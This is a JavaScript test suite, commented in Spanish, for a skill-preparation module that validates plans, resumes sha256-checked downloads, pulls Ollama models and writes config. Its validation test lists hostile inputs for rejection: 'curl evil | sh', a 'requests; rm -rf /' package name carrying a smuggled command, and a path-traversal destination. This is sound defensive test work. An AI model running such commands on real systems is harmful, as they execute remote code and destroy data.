// Preparación automática de skills (core/skills/preparar.js)
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { crearPreparador, validar, rutaSegura } = require('../skills/preparar');
const { analizarEstatico } = require('../skills/escaner');

const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'apolo-prep-'));
const DATOS = Buffer.from('modelo de prueba '.repeat(5000));
const SHA = crypto.createHash('sha256').update(DATOS).digest('hex');

function montar(plan, { gpuMB = 16303, cortarEn = 0 } = {}) {
  const raiz = tmp(), dir = path.join(raiz, 'skill');
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'SKILL.md'), '---\nname: prueba\ndescription: prueba\n---\nUsa {{modelos}}/x y {{config.url}}\n');
  fs.writeFileSync(path.join(dir, 'preparar.json'), JSON.stringify(plan));
  const cfg = { skills: { dirRecursos: path.join(raiz, 'recursos') }, proveedores: {} };
  const almacen = { obtener: s => (s === 'prueba' ? { slug: 'prueba', dir } : null) };
  let peticiones = 0, ollama = [];
  const fetch = async (url, o = {}) => {
    if (url.endsWith('/api/tags')) return { ok: true, json: async () => ({ models: ollama.map(name => ({ name })) }) };
    if (url.endsWith('/api/pull')) {
      ollama.push(JSON.parse(o.body).name);
      return { ok: true, status: 200, body: (async function* () { yield Buffer.from('{"status":"pulling","total":10,"completed":5}\n{"status":"success"}\n'); })() };
    }
    peticiones++;
    const desde = o.headers?.range ? Number(/bytes=(\d+)-/.exec(o.headers.range)[1]) : 0;
    const cuerpo = DATOS.subarray(desde), corte = peticiones === 1 && cortarEn ? cortarEn : 0;
    return { ok: true, status: desde ? 206 : 200, headers: { get: () => String(cuerpo.length) },
      body: (async function* () { if (corte) { yield cuerpo.subarray(0, corte); throw new Error('conexión cortada'); } for (let i = 0; i < cuerpo.length; i += 8192) yield cuerpo.subarray(i, i + 8192); })() };
  };
  const ejecutar = async cmd => (cmd === 'nvidia-smi' ? (gpuMB ? { code: 0, out: `NVIDIA GeForce RTX 5070 Ti, ${gpuMB}\n` } : { code: 1, out: '' }) : { code: 0, out: '' });
  const eventos = [];
  const prep = crearPreparador({ cfg, bus: { emit: (_, e) => eventos.push(e) }, almacen, fetch, ejecutar });
  return { prep, dir, cfg, eventos, peticiones: () => peticiones };
}
const esperar = async (prep, slug = 'prueba') => { for (let i = 0; i < 200; i++) { const t = prep.estado(slug); if (t && t.estado !== 'preparando') return t; await new Promise(r => setTimeout(r, 20)); } throw new Error('no terminó'); };

const PLAN = {
  formato: 'apolo-preparar/1', requisitos: { gpu: { fabricante: 'nvidia', vramGB: 8 } },
  pasos: [
    { id: 'modelo', tipo: 'descarga', url: 'https://huggingface.co/x/y/resolve/main/m.safetensors', destino: '{{modelos}}/prueba/m.safetensors', sha256: SHA, bytes: DATOS.length },
    { id: 'llm', tipo: 'ollama', modelo: 'qwen3:8b' },
    { id: 'conf', tipo: 'config', valores: { url: 'http://127.0.0.1:8188', carpeta: '{{modelos}}/prueba' } },
  ],
};

test('preparar: validar rechaza comandos libres, hosts raros y rutas que se salen', () => {
  const malo = { formato: 'apolo-preparar/1', pasos: [
    { id: 'a', tipo: 'comando', cmd: 'curl evil | sh' },
    { id: 'b', tipo: 'descarga', url: 'https://pastebin.com/raw/x', destino: '{{modelos}}/x' },
    { id: 'c', tipo: 'descarga', url: 'https://huggingface.co/x', destino: '{{modelos}}/../../Windows/x' },
    { id: 'd', tipo: 'programa', programa: 'malware' },
    { id: 'e', tipo: 'python', venv: '{{apps}}/v', paquetes: ['requests; rm -rf /'] },
    { id: 'f', tipo: 'git', repo: 'http://github.com/x/y', destino: 'C:/x' },
  ] };
  const v = validar(malo);
  assert.equal(v.errores.length >= 6, true, v.errores.join('\n'));
  assert.deepEqual(validar(PLAN).errores, []);
  assert.throws(() => rutaSegura('{{datos}}/../../x', { apps: '/A', modelos: '/M', datos: '/S/_datos', skill: '/S' }));
});

test('preparar: diagnóstico con GPU, descarga reanudable con sha256, Ollama, config y variables en SKILL.md', async () => {
  const { prep, dir, cfg, eventos } = montar(PLAN, { cortarEn: 30000 });
  const d = await prep.diagnostico('prueba');
  assert.equal(d.tienePlan, true); assert.equal(d.listo, false); assert.equal(d.puede, true, d.problemas.join());
  assert.equal(d.pasos.filter(p => p.estado === 'pendiente').length, 3);
  assert.equal(d.descargaBytes, DATOS.length);
  // 1ª vez: la conexión se corta → error, queda el .part
  await prep.preparar('prueba');
  let t = await esperar(prep); assert.equal(t.estado, 'error');
  const f = path.join(cfg.skills.dirRecursos, 'modelos', 'prueba', 'm.safetensors');
  assert.equal(fs.statSync(f + '.part').size, 30000);
  // 2ª vez: reanuda con Range y termina todo
  await prep.preparar('prueba');
  t = await esperar(prep); assert.equal(t.estado, 'listo', t.error);
  assert.equal(crypto.createHash('sha256').update(fs.readFileSync(f)).digest('hex'), SHA);
  const d2 = await prep.diagnostico('prueba');
  assert.equal(d2.listo, true, JSON.stringify(d2.pasos));
  const conf = JSON.parse(fs.readFileSync(path.join(dir, '_datos', 'config.json'), 'utf8'));
  assert.equal(conf.carpeta, path.join(cfg.skills.dirRecursos, 'modelos', 'prueba').replace(/\\/g, '\\'));
  const txt = prep.resolverTexto('prueba', 'Usa {{modelos}}/x y {{config.url}} y {{config.nada}}');
  assert.match(txt, /APOLO|recursos/); assert.match(txt, /127\.0\.0\.1:8188/); assert.match(txt, /\{\{config\.nada\}\}/);
  assert.ok(eventos.some(e => e.accion === 'preparar' && e.estado === 'listo'));
});

test('preparar: sha256 malo borra el archivo y falla; equipo sin GPU no prepara sin forzar', async () => {
  const malo = JSON.parse(JSON.stringify(PLAN)); malo.pasos[0].sha256 = 'a'.repeat(64);
  const a = montar(malo);
  await a.prep.preparar('prueba');
  const t = await esperar(a.prep); assert.equal(t.estado, 'error'); assert.match(t.error, /sha256/);
  assert.equal(fs.existsSync(path.join(a.cfg.skills.dirRecursos, 'modelos', 'prueba', 'm.safetensors.part')), false);
  const b = montar(PLAN, { gpuMB: 0 });
  const d = await b.prep.diagnostico('prueba');
  assert.equal(d.puede, false); assert.match(d.problemas.join(), /GPU/);
  await assert.rejects(b.prep.preparar('prueba'), /no cumple/);
});

test('preparar: el escáner marca rojo un preparar.json con pasos no permitidos', () => {
  const d = tmp();
  fs.writeFileSync(path.join(d, 'SKILL.md'), '---\nname: x\ndescription: x\n---\nhola\n');
  fs.writeFileSync(path.join(d, 'preparar.json'), JSON.stringify({ formato: 'apolo-preparar/1', pasos: [{ id: 'a', tipo: 'comando', cmd: 'x' }] }));
  const r = analizarEstatico(d);
  assert.equal(r.nivel, 'rojo'); assert.ok(r.hallazgos.some(h => h.regla === 'preparación: paso no permitido'));
  fs.writeFileSync(path.join(d, 'preparar.json'), JSON.stringify(PLAN));
  assert.notEqual(analizarEstatico(d).nivel, 'rojo');
});

test('preparar: la carpeta de recursos se cambia por la config (ruta completa) y vuelve a la de por defecto con ""', () => {
  const { guardarConfig } = require('../admin');
  const dir = tmp(); fs.writeFileSync(path.join(dir, 'config.json'), JSON.stringify({ skills: { rutasExtra: ['x'] } }));
  const cfg = { dir, permisos: { modo: 'preguntar' }, proveedores: {}, skills: { rutasExtra: ['x'] } };
  const destino = path.join(os.tmpdir(), 'APOLO-recursos-prueba');
  guardarConfig(cfg, { skills: { dirRecursos: destino } });
  assert.equal(cfg.skills.dirRecursos, path.normalize(destino)); assert.deepEqual(cfg.skills.rutasExtra, ['x']);
  assert.equal(JSON.parse(fs.readFileSync(path.join(dir, 'config.json'), 'utf8')).skills.dirRecursos, path.normalize(destino));
  assert.equal(require('../skills/preparar').rutasBase(cfg).modelos, path.join(path.normalize(destino), 'modelos'));
  assert.throws(() => guardarConfig(cfg, { skills: { dirRecursos: 'relativa/x' } }), /ruta completa/);
  guardarConfig(cfg, { skills: { dirRecursos: '' } });
  assert.equal(cfg.skills.dirRecursos, undefined);
});

test('preparar: si APOLO se reinicia a medias, reanudar() sigue la preparación sola', async () => {
  const a = montar(PLAN, { cortarEn: 30000 });
  fs.mkdirSync(path.join(a.dir, '_datos'), { recursive: true });
  fs.writeFileSync(path.join(a.dir, '_datos', 'preparacion.json'), JSON.stringify({ pasos: {}, ultimo: { estado: 'preparando' } }));
  const { crearPreparador } = require('../skills/preparar');
  const almacen = { obtener: s => (s === 'prueba' ? { slug: 'prueba', dir: a.dir } : null), lista: () => [{ slug: 'prueba', dir: a.dir }] };
  const DAT = fs.readFileSync(path.join(a.dir, 'preparar.json'), 'utf8');
  assert.ok(DAT);
  const p = crearPreparador({ cfg: a.cfg, almacen, fetch: async (url, o = {}) => {
    if (url.endsWith('/api/tags')) return { ok: true, json: async () => ({ models: [{ name: 'qwen3:8b' }] }) };
    const desde = o.headers?.range ? Number(/bytes=(\d+)-/.exec(o.headers.range)[1]) : 0, c = DATOS.subarray(desde);
    return { ok: true, status: desde ? 206 : 200, headers: { get: () => String(c.length) }, body: (async function* () { yield c; })() };
  }, ejecutar: async cmd => (cmd === 'nvidia-smi' ? { code: 0, out: 'GPU, 16000\n' } : { code: 0, out: '' }) });
  p.reanudar();
  await new Promise(r => setTimeout(r, 30));
  const t = await esperar(p);
  assert.equal(t.estado, 'listo', t.error);
  assert.equal(JSON.parse(fs.readFileSync(path.join(a.dir, '_datos', 'preparacion.json'), 'utf8')).ultimo.estado, 'listo');
});

test('preparar: requisitos externos (lo instala el usuario) sin pasos: plan válido, se enseñan y la skill queda lista', async () => {
  const plan = { formato: 'apolo-preparar/1', requisitos: { externos: [{ nombre: 'Roblox Studio', url: 'https://create.roblox.com/', detalle: 'actívale el MCP' }] }, pasos: [] };
  assert.deepEqual(validar(plan).errores, []);
  assert.ok(validar({ ...plan, requisitos: { externos: [{ nombre: 'x', url: 'http://malo' }] } }).errores.length);
  assert.ok(validar({ formato: 'apolo-preparar/1', pasos: [] }).errores.some(e => /no hay pasos/.test(e)));
  const { prep } = montar(plan);
  const d = await prep.diagnostico('prueba');
  assert.equal(d.listo, true); assert.equal(d.externos[0].nombre, 'Roblox Studio'); assert.equal(d.externos[0].url, 'https://create.roblox.com/');
});

test('preparar: con espejo local baja por sha256 del espejo; si el espejo no lo tiene, va al original', async () => {
  const usados = [];
  const a = montar(PLAN);
  a.cfg.skills.espejo = 'http://192.168.1.50:8099/';
  const { crearPreparador } = require('../skills/preparar');
  const almacen = { obtener: s => (s === 'prueba' ? { slug: 'prueba', dir: a.dir } : null) };
  const servir = () => ({ ok: true, status: 200, headers: { get: () => String(DATOS.length) }, body: (async function* () { yield DATOS; })() });
  const mk = espejoTiene => crearPreparador({ cfg: a.cfg, almacen, ejecutar: async c => (c === 'nvidia-smi' ? { code: 0, out: 'G, 16000\n' } : { code: 0, out: '' }), fetch: async (url, o = {}) => {
    if (url.endsWith('/api/tags')) return { ok: true, json: async () => ({ models: [{ name: 'qwen3:8b' }] }) };
    usados.push(url);
    if (url.includes('/sha256/')) return espejoTiene ? servir() : { ok: false, status: 404 };
    return servir();
  } });
  let p = mk(true); await p.preparar('prueba'); let t = await esperar(p);
  assert.equal(t.estado, 'listo', t.error); assert.ok(usados[0].startsWith('http://192.168.1.50:8099/sha256/' + SHA)); assert.ok(!usados.some(u => u.includes('huggingface')));
  fs.rmSync(path.join(a.cfg.skills.dirRecursos, 'modelos'), { recursive: true, force: true }); fs.rmSync(path.join(a.dir, '_datos'), { recursive: true, force: true }); usados.length = 0;
  p = mk(false); await p.preparar('prueba'); t = await esperar(p);
  assert.equal(t.estado, 'listo', t.error); assert.ok(usados.some(u => u.includes('huggingface.co')));
});

test('preparar: estadoRapido dice si a una skill le falta prepararse sin tocar el equipo', () => {
  const { estadoRapido } = require('../skills/preparar');
  const d = tmp();
  assert.equal(estadoRapido(d), undefined);                                   // sin preparar.json: no necesita
  fs.writeFileSync(path.join(d, 'preparar.json'), JSON.stringify(PLAN));
  assert.equal(estadoRapido(d), 'pendiente');
  fs.mkdirSync(path.join(d, '_datos')); const f = path.join(d, '_datos', 'preparacion.json');
  for (const [e, r] of [['preparando', 'preparando'], ['error', 'error'], ['cancelado', 'pendiente'], ['listo', 'lista']]) { fs.writeFileSync(f, JSON.stringify({ pasos: {}, ultimo: { estado: e } })); assert.equal(estadoRapido(d), r); }
});
